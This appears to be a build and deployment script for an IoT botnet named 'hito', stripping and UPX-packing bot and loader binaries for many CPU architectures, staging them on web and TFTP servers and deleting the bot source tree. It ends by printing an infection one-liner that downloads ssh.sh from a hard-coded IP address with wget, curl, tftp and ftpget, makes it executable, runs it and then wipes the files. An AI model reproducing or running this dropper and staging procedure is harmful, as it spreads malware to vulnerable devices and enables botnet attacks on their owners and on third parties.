# nios2-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.nios2
# or1k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.or1k
# riscv64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.riscv64
# sh4-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hsh-sh4
# x86_64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86_64
# i686-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.i686
# xtensa-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.xtensa
# 
# arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arc
# alpha-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.alpha


mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh ~/botH

rm -rf enc.c
rm -rf enc
mv ssh.sh /var/www/html
mv bin /var/www/html
mv sensi.sh /var/www/html

cp release/hbfin /var/www/html
cp release/hm68k-coldfire /var/www/html
cp release/hriscv64 /var/www/html

cp release/hbfin /var/www/html/wrgjwrgjwrg246356356356
cp release/hm68k-coldfire /var/www/html/wrgjwrgjwrg246356356356
cp release/hriscv64 /var/www/html/wrgjwrgjwrg246356356356
rm -rf release
rm -rf installs.sh

# Custom wrote UPX lawl L -light

chmod 111 upx
./upx --ultra-brute /var/www/html/wrgjwrgjwrg246356356356/h*
./upx --ultra-brute /var/www/html/h*
./upx --ultra-brute /var/lib/tftpboot/h*
./upx --ultra-brute /var/www/html/wrgjwrgjwrg246356356356/n*
./upx --ultra-brute /var/www/html/n*
./upx --ultra-brute /var/lib/tftpboot/n*

rm -rf upx*


echo "[hito] Payload = cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.227.13/ssh.sh; curl -O http://178.62.227.13/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 178.62.227.13 -c get ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp -r ssh2.sh -g 178.62.227.13; chmod 777 ssh2.sh; sh ssh2.sh; ftpget -v -u anonymous -p anonymous -P 21 178.62.227.13 ssh1.sh ssh1.sh; sh ssh1.sh; rm -rf ssh.sh ssh.sh ssh2.sh ssh1.sh; rm -rf *"


